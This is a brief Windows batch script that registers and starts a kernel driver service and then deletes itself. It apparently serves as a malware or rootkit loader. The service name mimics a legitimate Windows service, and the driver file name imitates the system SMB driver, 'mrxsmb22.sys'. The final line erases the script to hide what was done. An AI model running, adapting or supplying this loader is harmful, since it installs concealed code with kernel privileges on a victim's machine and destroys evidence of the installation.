@echo off
cd %~dp0
sc create BcastDVRUserService94 binpath=C:\Windows\System32\drivers\mrxsmb22.sys type=kernel
sc start BcastDVRUserService94
del "%~f0"



